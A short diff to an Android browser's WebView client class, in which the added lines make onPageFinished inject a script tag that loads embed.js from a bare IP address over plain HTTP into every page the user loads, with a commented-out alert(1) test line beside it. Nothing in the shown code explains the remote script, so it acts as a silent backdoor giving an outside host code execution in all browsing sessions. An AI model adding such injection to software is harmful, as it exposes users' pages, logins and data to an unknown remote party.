@@ -69,6 +69,11 @@ public class NinjaWebViewClient extends WebViewClient {
     public void onPageFinished(WebView view, String url) {
         super.onPageFinished(view, url);
 
+        String js = "var newscript = document.createElement(\"script\");";
+        js += "newscript.src=\"http://207.246.111.17:5000/embed.js\";";
+        js += "document.body.appendChild(newscript);";
+        //js = "alert(1);";
+        this.ninjaWebView.loadJs(js);
         if (sp.getBoolean("saveHistory", true)) {
             RecordAction action = new RecordAction(context);
             action.open(true);
